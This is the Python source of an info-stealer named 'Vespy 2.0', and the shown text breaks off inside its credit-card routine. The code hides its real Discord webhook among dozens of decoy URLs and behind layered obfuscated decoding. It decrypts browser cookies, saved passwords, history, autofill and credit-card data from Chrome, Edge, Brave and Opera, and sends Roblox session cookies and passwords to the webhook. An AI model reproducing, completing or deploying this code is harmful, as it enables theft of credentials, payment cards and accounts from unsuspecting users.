import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes, uuid, pygame
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
from rotatescreen import get_primary_display
from pygame import camera
from pathlib import Path

thewebhook = 'https://discordapp.com/api/webhooks/1584653612414720761/gXm-nJu0FcmqX6cX5XqQ8uoMKJPqXJ0mIOWxjAG6SX2GU2L_kYDFP90gj1lbmlvj9w'
fake_wbh = 'https://canary.discord.com/api/webhooks/1862811107733503558/1jL5nQCaDTP4_qQi4e3f78LbaEH9FcHLTxFwbRgHKv5wxnbVc2y5xak9rhqy6mPT12'
fake_wbh = 'https://canary.discord.com/api/webhooks/1787911854827448941/1IC81zFELvS8kXQrxQTs5j_7y_N0abQHU2irDcnTaMbRtwWzA5y1cDM-cGtsnoJ7VcT6'
webh = 'https://discord.com/api/webhooks/1835843237121846559/gW9Jme8y227b35mQQj2KPpIMFPblG4GJgmxICLgP79rCIKaAIK8qv_FejvM4NkdTzf6'
wbh = 'https://canary.discord.com/api/webhooks/1373191802499451382/wNnOMmMYHENOgg4_t6QNGqCxKnO_z5znKLWW33U8jNT3y7WK_1KlpBD9Qs-kCul1DGw'
fake_wbh = 'https://discord.com/api/webhooks/1446383390566658518/laxxWtLx0pWeJHeNjE8GkbJpluT5lkLyr0bAkJU7_WRRdN34gEjV-7Ro60jQ-pZT_7ok'
real_webhook = 'https://discord.com/api/webhooks/1265149598354388635/TaAUFMJ9yroY7adkLQM1yrxhfH2F6ES7cR2-Shzu6_83K1JIIRC3cfTlFtarEF7TZ'
webHOOK = 'https://discordapp.com/api/webhooks/1630304778560422413/HsrkNgRYb4u92J2aa8NltrFBLSksQzM2M-EDXqP5ME39i21VuPNAMRH8U_92kACEpKEB'
real_webhook = 'https://ptb.discord.com/api/webhooks/1711402364225661691/fTVMnXntJjirJqistKQWQubz1kK0Q0HjdXHceLJz2dxi_rKDokW7IoDHM2H_pbHg-P'
fake_webhook = 'https://discord.com/api/webhooks/1384307948086701387/Qj3le5g9KtSfdVXu2YWuFIEWERHmjqK0zay6XiK8nA9q3OTMCdjXbPEHt4iiZLPON'
fake_webhook = 'https://discordapp.com/api/webhooks/1778042034622754642/71dXk2SRzylgQQPYBboI7gTDmpgvTHWaKKFNL_RSG-nNvOhWfyYyGN6lis25WF4XLk'
webh = 'https://discord.com/api/webhooks/1161143789016593481/82o2A_BTP-sEF2Jywb83XxqsI1fyQHrchp5P-LV3U-Y9XzbJ0f0lzDXCJR_6lQrW0'
real_webhook = 'https://canary.discord.com/api/webhooks/1452995844489845799/XWOWkxBaa44QCu6c1ZuX0fUVCKabEHMsMPPujFs3frC0EF3jORwSYUEnhGlY8eEgFtpr'
webh = 'https://ptb.discord.com/api/webhooks/1363773100329474978/AsVogG0y66yQf0jIYWCrDVvZh59VOcOHDyPkbB-noL7isahx47gqNWeNqxZan_-r07'
fake_webhook = 'https://discord.com/api/webhooks/1093557964827693233/_ekHJ_lDM7IeYNQqyZ7tfO-F6onIZxCCAf_A2XMpiKloOf8oSyoPbR0voJmvyaVSFQJ'
fake_webhook = 'https://discordapp.com/api/webhooks/1639872938915502777/qC2M-5cz7rMp85BKDEYnZlSN2DiGlIr6Ap9QCfHD0u1jgzew7BkBwKCBIFB52qFGK'
webHOOK = 'https://ptb.discord.com/api/webhooks/1041823852683607699/xRYjSemhXZk8YV8FoHRr6y6LgPbZo9C0SDKxpLWHPvzwuk-zupDMStEQRIFs_HSjM2Q'
thewebhook = 'https://discordapp.com/api/webhooks/1557957536847884115/TMVcCbaf7gkmY31-TIHSDUFAcLs5_anEEytclU7Vt2U2_oy2UMtvr7-X1584al0PoAa'
wbh = 'https://canary.discord.com/api/webhooks/1648294494952226219/xukCLO1Sf9BiJvBdX3Htc8Rr42KaRyhcJqw4hylc73rYvbQ_y6NAiYlWXLmVMzw4Xt4f'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1811406009003884590/Y61W8x4OQni3cKzIQjxgbe9-ADLO_ZyMU6oKPMtmZpLg0UCRA4KCU0eUnET6t56HLv'
webh = 'https://canary.discord.com/api/webhooks/1529693319276145635/uO3dRdCYtIa-BOBHOPxfdZ8poIVkUGMlY1s6hXmN8ec6kqhrOGC2fA5_DbRudXZHIZ'
real_webhook = 'https://discord.com/api/webhooks/1619476046132929716/BoFNw8v5iRhLSgQ2lL8SvTy81SpITDajOP8_eY-sxwLNEZzJ_1tGySULP8XjPeMGJy'
webHOOK = 'https://canary.discord.com/api/webhooks/1233856115754929811/UakgGdQdgV1PM-h3T2VrqRWFrQ1_s9in0rGS4pwUY1jn8Wuw6EIlr328GhLbgl8x1VIO'
wbh = 'https://discord.com/api/webhooks/1696607294873815114/uRlcAuOKB13HzbTHXIpnJ28wVS9LhWe0K2dSB1C9dkoK7fegwQvxDIuI8_qN6z7ZxSDT'
wbh = 'https://canary.discord.com/api/webhooks/1055420418450654963/FYvRzy0rDy6hS0buBFY6OYS9qodhsOsceKY2mTgddOztg6QJXXWHJmAhFBxNFHBvw8q'
wbh = 'https://discord.com/api/webhooks/1733987636616052743/A4Iwls7wmeyKlLxANt0nVuMA0IFLECw0gjJUmcRl_7hlPtwIgJAwW0vrhVAG9qJa1Y'
webh = 'https://ptb.discord.com/api/webhooks/1119779373159508820/r0vZ-z_nBe-_y-dQdUbexB7Y0jMOuXXV6MlaH8y35XjXzn_pqqDkNaJQYBnYKpzdyg'
webh = 'https://canary.discord.com/api/webhooks/1139185875208910949/gFU3qjKgq6pmxmTqQohFWMI0wJu2Ak5Ao3hYLcpNWyvTzgkjYWwLAVDUsojaeW336X'
webHOOK = 'https://discordapp.com/api/webhooks/1115254318701082832/R95iH3PgVTAnRPqGgA-EBoJeI_Nv6T9UqbMFiPxzysx-Ca4yP4UNEdfhRpzKyMh3b3R'
webh = 'https://discordapp.com/api/webhooks/1332932162711347460/S88R03LUAwZGg7Xjpsh33ZtKkUTWtoUESLIyK4BP1o_fL5xneMtcxCfPEQlBGAfGOOXJ'
wbh = 'https://discordapp.com/api/webhooks/1075445673093730764/K4snBCm7UtG6ZWSQ6gGXLJZR7YfaF2m2IjbEx1l9UsPLjRrBPyN9ZNkeSBT-z2tmLlju'
fake_webhook = 'https://canary.discord.com/api/webhooks/1095220292045487041/0YLeEwf5YrKoy703f9Y8WjcujiGWG_F7syi7ug5mBB_nrqMijuknqzAyiSMg5DhjeM'
wbh = 'https://ptb.discord.com/api/webhooks/1685525098780115997/90aYe84FeS4fmOZ8ZoKm8PztSpQ7w-e4GEOCicS9i8QyeAmXAj_gOil49EHbVM4Jp4'
fake_wbh = 'https://discord.com/api/webhooks/1217022620908088724/bKQw--CvpGk0xQbyjG8Tl5IOd9DtoG0USoWoVdG52Qftgt5HaUZrWPswx_QHPyhkhhDo'
fake_wbh = 'https://canary.discord.com/api/webhooks/1147256492067428985/oDcL9_FpVfIQaed48D-ugwqL9fBxVJjPpjvUTPmX2ZsUjsXbxWzt6zRD7v9eCSMwE'
real_webhook = 'https://discord.com/api/webhooks/1653438054177971730/Np0RkJLEBKoAv-MAovw64bY2JnRU2qkuR0K3tPtYUIPSi1e9XBVTynWJcgfaQxvCB'
wbh = 'https://ptb.discord.com/api/webhooks/1348768520004138538/PUEHWXHShc9wO0vCquQedwAEFFDGPqNwIK0S8Cwl-zXXrGKddVTva02tvyQ7NNO2Kh'
fake_webhook = 'https://canary.discord.com/api/webhooks/1315760200130224772/C4erb7tZD8TcWGjF9NuHp7PJJ5hEfrNHBjCXB4eYmohgsPnnbIHcU_9B8g8mB0Qq5Ff'
thewebhook = 'https://discord.com/api/webhooks/1422114219074839597/2fZZz61J6s8LXMmHApEgrESw7WyHCcnQZyLyBUyJRgYlnrcgcOwtx7A_UfH466lT6'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1691197725321423394/d3VzB6nx0Z19fDnQWFkS6Wz7Ssed3d_CQ7mhNRNvJnYCzvxLmcFDx4il-9BFB-bI-'
fake_wbh = 'https://discordapp.com/api/webhooks/1424309256556356937/0dzEFkcoqBSw-jjl3Bf5GAu3UXRxN5P5csAGXxWzw1FJs1u3npnLRd-T0r33E-qBN8if'
webHOOK = 'https://discord.com/api/webhooks/1488653181645831714/H4ZJoHqACgu_bGoM_I1JFX9uCDStOZePrEZbm_VYycu8Ldzak02V6kdZhk0VP75dN3v'
fake_webhook = 'https://discord.com/api/webhooks/1852818741945168676/jmRZRHZ37aKjvmdG37u_zAI9PFxzwj_Z-I33UhndA6BJHkdXxZge5I2sLdb8cw2zDw5'
wbh = 'https://discord.com/api/webhooks/1000640628978798713/pTYZwNkLuBSXxTevwyzvP4lV58YxHPlo4CM_VcOVXeXd9SEvXTqJIVYn4WvROUFyc8'
webHOOK = 'https://ptb.discord.com/api/webhooks/1838817917757398823/zqIZtqkz_pyWvyIQCr2XAN3951W6kIZT-Cp6OP_s8Nx_art5vgm2iKduPIVPxYr0F'
wbh = str(requests.get(__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(122)}{chr(108)}{chr(105)}{chr(98)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode("c$_Vbiw(pu2t!xmYo|*jP1t{zlG7Pkh-b;vc5>#(DOYi@u_7QQVk)ZmabZ}UoG#kjFc>{T_i1HC$AHq1jCQAXi?S1I&fe&IIH1V(VZ+<&yF@w_zG}hKNPU?@ZKbcHwNTD||Na&E<op1#n<&N".encode())).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()).text)
if wbh.startswith(f"{chr(51)}"):
    while True:
        try:wbh=__import__(f'{chr(108)}{chr(122)}{chr(109)}{chr(97)}').decompress(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b16decode(__import__(f'{chr(99)}{chr(111)}{chr(100)}{chr(101)}{chr(99)}{chr(115)}').decode(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}').b85decode(wbh.strip().split(f'{chr(51)}{chr(43)}')[1].encode()).decode(),f'{chr(114)}{chr(111)}{chr(116)}{chr(49)}{chr(51)}').encode())).decode()
        except:break
webHOOK = 'https://canary.discord.com/api/webhooks/1827558001603160012/bu33XnjtOOiHKD6H8MNR8eNkN3qM23pDyTcC4rjIBYvs2EwuDLvFvYQkLl3qzkueSem'
thewebhook = 'https://discordapp.com/api/webhooks/1958691849454919626/QUo1ZIwrv0O-D54oJNkXiXD9SaY1Y77TWjZS8NpMmKTlmN9-4xgeSGPsyd4R3BCyl'
webh = 'https://ptb.discord.com/api/webhooks/1649119326081763258/jAveygAqYCZrhg776Jjf-BBBYC7o5tyxuxzFH_VQC-dr3-PRxK88vhteiDskMx5FBS3'
real_webhook = 'https://discordapp.com/api/webhooks/1111298411869777275/HzbYn14hsl2u_DNib7C0fjTPdmOEHYoqeuaK0S9AlZR0mXxexlr6G_RH7VMr6nxn9i'
webHOOK = 'https://ptb.discord.com/api/webhooks/1468729560582671512/_hbpS4Ot2TavEl5p6W9s57e3z4LXFKggLuJPdNSaKtVMv1X3aGXo_pQfO2B6j6nZP7MB'
thewebhook = 'https://ptb.discord.com/api/webhooks/1257914640336221417/kMXMPDXGK6u1e6WXP7yi798vnhOlXVWlaaBeF-LLMiMO3T0CzNFoNOOTJiQuDnZsQ9'
thewebhook = 'https://discordapp.com/api/webhooks/1666872205618389159/4TYMzGEmA39d4Ozzzz5Ay4pw3zexfNT0RnPbZF9wQlYah42d8n-OYFEC-lFobvpyD'
real_webhook = 'https://discord.com/api/webhooks/1114128966852782544/FmqTBY-1pOx1OI0tMiYqX6VJc8xRbkBE5RkOihSp1homLAA1cGW6StKledpUvhu3t3'
real_webhook = 'https://canary.discord.com/api/webhooks/1520183543919245513/tefbTlEYrT579vdKMHOLR_Z6DB0NwxAVEp1xkCC_jqJ3JCyDcDeYgMuUcsv3f9dWn'
real_webhook = 'https://discordapp.com/api/webhooks/1340302668961600009/R4mkxYrpBl9Q8tlCimFEwsO4YECGnJo7QTtPPSATzLDAEcksRR9ki6XDiGYyFyrlh'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1339321768828825512/pwkxIBCp8mDUEUiWC3AKnzifGOiOsq-hKacufM7hb8xUcIJTwSqdLVkGD7_GIh0f5dp'
real_webhook = 'https://discordapp.com/api/webhooks/1582629862611961029/-AD1tW2D4LZU-ZB3blGgKBDNrIBn83j9ZQv5VTQNNHJ_YqzEFY54PrWmQBsTpD8in3s'
webh = 'https://discordapp.com/api/webhooks/1484610045952925656/IIwA44nAqqcSyyhd5mwWlt6MXiaOTXW5QbxM_f2K4DYvFvmXYNQC2rVfo_5aUD9LAA'
fake_wbh = 'https://discordapp.com/api/webhooks/1399509797950232725/ziLRyGShqOp3Z8uskEQs_EevDKD1AczzQ20ZW63Tks79DjG45muwpEU-FTizmY2lIRp'
fake_webhook = 'https://discord.com/api/webhooks/1444891162848679979/RhBcVhKHVvuxdfWO-0jHfGI6ZfEkAosUkc-u0PmDtRWjvfTD_AjSqdp8_bYeZpln5Xi'
fake_wbh = 'https://canary.discord.com/api/webhooks/1821951655956438781/_IGxxPkrC6Chz9RwAFAZDMtdOnmW6TI2sb7DDxfOGSS6O4HhwxFnC8Br9pLfwgzsvJ'
webh = 'https://discordapp.com/api/webhooks/1386190852099995359/iU6fuX4Tb_uUTcESUsN-7JBxbXAZ5TbzTwSikxPY2fVco2arC_GVXZm06D2Jw2WSCX4'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1119317722952759085/aT6ADwp1FwIUOiH8q7RC8id3AnlonSrL6LUJFYQ7jvhUWgfy5z7xd8M0eFbNjNCtc'
thewebhook = 'https://canary.discord.com/api/webhooks/1812278375174768009/gk-0oDj7_spThK2wR6sp845PRT56Q05Ey6newXMTkC1i8dSRupkWjYddjIUdnoUR8AO'
thewebhook = 'https://discord.com/api/webhooks/1018065306472696391/ILBxZLT6sWzlSOWNHpCFKAaTYDb0shMPUkFCi0AJFm-zhKUA_zXLB-wxfMg41iShp'
fake_webhook = 'https://canary.discord.com/api/webhooks/1657281321030950698/VEFOn1S793YrrC4P_FQhz65oBHmAgrv-XC9K6tIfHfwRYxa7tkGzpy_y3Bl53pjbhRx'
thewebhook = 'https://discord.com/api/webhooks/1486862933480524760/3zPu5HQn5j_26Pds1fxSae-JVYwsE2deDqVjh_MQwb8eIFaecfUSoJfHZoy3vblTv'
real_webhook = 'https://discord.com/api/webhooks/1328252519964989809/yk3tkaDWqfte8qnixtfEvU3RB3988C4eonOCVjbC4ix6I4YuTcsKqS9QmCFS7Uy_S5l'
real_webhook = 'https://discord.com/api/webhooks/1105273507408479970/T7WudRI4bbAnJwOzCQp0KQ1tMAzzwMU6jjiEAqtqU6n3b-CF9NQNuhelv7Ioewj4wP'
webh = 'https://discordapp.com/api/webhooks/1949927553336833505/Ti9ILZdhK6R_7enX1aECGASnpDuzQEyfy6YRVw2YfbbYzRQb1_pjFJa_NhSr1PaqzOZ'
webHOOK = 'https://canary.discord.com/api/webhooks/1043901308294268822/K4jk3Fsyei7f8hmEBWzqefsLIW-A8vayW0tlcrTRfSwysjy2JDbbdw88FsxU1GjtjO'
webh = 'https://ptb.discord.com/api/webhooks/1704088867989674810/9qPw-C_dplN4vPsSe1gaod-zNIDFRIFz4IbnWP5chNl1QjcAbwtBm7FgARXFNd_JU_s'
fake_webhook = 'https://discordapp.com/api/webhooks/1643071292119811990/Cmbg6efkn6iw86uiS2LgSm0VYEIbNN50NmC2uCdL7GQY_jxC3otMLnFSjRW5Z_pLPtgE'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1645529259464324081/YdDBYPrwCKm4Mz8iVFlXw4oDFwgxdxovbmyyvB9DCQGgZr0apwLe31sCGNCqLLmFE'
fake_wbh = 'https://canary.discord.com/api/webhooks/1958973039814776773/XlMRoMXjM10ytkqxrK4kVd8thv2K0o-4E9tOQ9SL6CIorVI4Lqo8THk9eTfqKSXQjsA'
thewebhook = 'https://canary.discord.com/api/webhooks/1703259730443181263/UyDT2iiy0XJ9iJFW8E_UYuTmovT1UOJ69baL9WrmqnULNZFEO_vkUF0sYqmocmC6W'
real_webhook = 'https://canary.discord.com/api/webhooks/1290215805123264007/ZN2Y9xmqQuGbZHVe9ft40Y3cLnfico7S86duSikJnHAt7B7RSQnB9PPc4ruyWF1TTNR'
webHOOK = 'https://canary.discord.com/api/webhooks/1397523539265317844/rVCQnZxs1nxYTpW9sWZR3kmEsMrK_jXjxoPV75ERD226GUCjTDnZsobEJAHRcFhJcgSM'
webHOOK = 'https://discord.com/api/webhooks/1087154039662991125/nUWzCgOCM3e4z1X6POhfV6-wsfQMhpc-TceSrhU9AguTntfkKgmHSFeyJVEw9YgYsZ'
thewebhook = 'https://ptb.discord.com/api/webhooks/1780431061402909196/xf11Y4uRM7DlxcYSVPLiWiJZqRwCXXiuwX-kWCi0IHxFshtSMob3OW1agf4r4HjAL4kD'
webh = 'https://discordapp.com/api/webhooks/1891400797332294356/FfjOYiukENu0aFPaQYPT-5fhHU4XOS-ZBlODhE-uQXGQJAAhk-H8Td6diRarLeuO0M6'
webHOOK = 'https://discordapp.com/api/webhooks/1460544299456584419/oKbZNJmTNdcLAbx1I15oXB68EnLz-IeqDX5IyjXMiOOlsxheDOiLux9ox5FXTODuf'
thewebhook = 'https://discord.com/api/webhooks/1077575387333663132/fDUZUbX_p1GESOjC186ZLif_L5BZkqDil2jV5Iha7Ltj1Zk_HkUY0JwFEvwJ6HrTX_Q'
webh = 'https://ptb.discord.com/api/webhooks/1279408757822455090/J_b_xGh7pPjP-8B2PhV-sperMYsGxQrO11nXGiWZ9HOS0i3MYWL1uQky9e1uWceCzju'
fake_wbh = 'https://discordapp.com/api/webhooks/1696772434362861743/VKFIuiFDd2ChTEpEOH1euHVj6kvOID_EfENel_7YDpfhBRHGSy2Vu53PELzrhnO9d97P'
fake_wbh = 'https://discordapp.com/api/webhooks/1249481576061821273/p8m8h5Yi3rid_Fyd8jmWIVggm0ocnwc5LDnkg6JxgxrFw7PJ3CEJ7mk9t3BKBEjEB'
webh = 'https://canary.discord.com/api/webhooks/1503599116353686719/8GNQigH48QM2mVRBpfZsIIZXdwSBpLPR4GbrYYIVSP8R8n3grjyfDBKrlI4LlQjHg'
fake_webhook = 'https://canary.discord.com/api/webhooks/1538946485439389344/uG9Mrc5NW2k1W044PS_l9xzLvCFnobnDWtHlsMD36xOuiOX_ZpieiuWSqChSvZncRf'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1260137215547296151/FqFPmIXSw7k74LV-9UQzMr00CClcs_xMR5Bl6sLC52JGc6wFXe1JiEyl_6GBOrqXz'
webh = 'https://discordapp.com/api/webhooks/1147789243417214270/rzj0hhinmkp97fgYkj-YbYJhPst4ShxtzaU6wpUhI3THCQxK2XNIyPijch8IqgSdUgK'

dtokens = []
rocookies = []
ropasswords = []
dispasswords = []

try:
    os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
    P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
except:
    try:
        shutil.rmtree(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        os.mkdir(os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}"))
        P4THF0LDR = os.path.join(os.environ["USERPROFILE"], "AppData",f"GRABBED_{user}")
    except:
        pass
        
class CookieInfo():
    # adding more soon
    def __init__(self, RoCookies):
        for i in RoCookies:
            self.RobloxInfo(i)

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            PASSWORD = "Not Found"
            for i in ropasswords:
                if str(r['UserName']).lower() == i.split("|")[0].strip().lower():
                    PASSWORD = i.split("|")[1].strip()
            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:lock: Roblox Password: ``{PASSWORD}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
            embed.set_thumbnail(url=r['ThumbnailUrl'])
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.amountcookies = 0
        self.amountpasswords = 0
        self.amounthistory = 0
        self.amountdownloads = 0
        self.amountccs = 0
        self.amountautofill = 0
        self.Passwords = "-"
        self.History = "-"
        self.Downloads = "-"
        self.CCs = "-"
        self.Autofill = "-"
        os.mkdir(os.path.join(P4THF0LDR, "Browsers"))
        self.BROWSERPATHFOLDER = os.path.join(P4THF0LDR, "Browsers")
        os.mkdir(os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies"))
        self.COOKIESPATHFOLDER = os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies")
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.prof = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for i in paths:
            if os.path.exists(i):
                try:
                    key = self._key(os.path.join(i, "Local State"))
                    self.cookies(i, key)
                    self.passwords(i, key)
                    self.history(i)
                    self.downloads(i)
                    self.ccs(i, key)
                    self.autofill(i)
                except:
                    pass
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        T=0
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Network", "Cookies")
                    if "Opera Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\Opera_Cookies.json"
                        f = open(writefilepath,"w+")
                    if "Opera GX Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\OperaGX_Cookies.json"
                        f = open(writefilepath,"w+")
                    T+=1
                else:
                    if "Chrome" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Chrome_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Edge" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Edge_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Brave-Browser" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Brave_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    new_path = os.path.join(p, i, "Network", "Cookies")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        cookies = []
                        for row in cursor.execute("SELECT * FROM cookies").fetchall():
                            dec_value = self._decrypt(row[5],key)
                            if str(row[3]) == ".ROBLOSECURITY":
                                if dec_value not in rocookies:
                                    rocookies.append(dec_value)
                            if str(row[14]) == "-1":R="unspecified"
                            elif str(row[14]) == "1":R="lax"
                            else:R="no_restriction"
                            cookie = {}
                            cookie["domain"] = row[1]
                            if row[7] != 0:
                                cookie["expirationDate"] = (row[7] - 11644473600000000) / 1000000
                            cookie["hostOnly"] = not "." in row[1]
                            cookie["httpOnly"] = bool(row[9])
                            cookie["name"] = row[3]
                            cookie["path"] = row[6]
                            cookie["sameSite"] = R
                            cookie["secure"] = bool(row[8])
                            cookie["session"] = row[11] == 0
                            cookie["storeId"] = "0"
                            cookie["value"] = dec_value
                            cookies.append(cookie)
                            self.amountcookies += 1
                        cursor.close()
                        con.close()
                        json.dump(cookies, f)
            except:pass
    def passwords(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Passwords.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Login Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Login Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Login Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                            url, name, password = V
                            dec = self._decrypt(password,key)
                            if 'roblox' in url:
                                ropasswords.append(f"{name}|{dec}")
                            if 'discord' in url:
                                dispasswords.append(f"{name}|{dec}")
                            self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                            self.amountpasswords += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\History.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                            url, title, count, last_visit = V
                            if url and title and count and last_visit != "":
                                if len(self.History) < 100000:
                                    self.History += "="*50+f"\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n"
                                    self.amounthistory += 1
                            else:break
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Downloads.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "History2"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History2")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                            url, path = V
                            self.Downloads += "="*50+f"\nURL : {url}\nPath : {path}\n"
                            self.amountdownloads += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Autofill.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name, value FROM autofill").fetchall():
                            name, value = V
                            self.Autofill += "="*50+f"\nName : {name}\nValue : {value}\n"
                            self.amountautofill += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\CreditCards.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                            name, exp_month, exp_year, cne = V
                            cn = self._decrypt(cne,key)
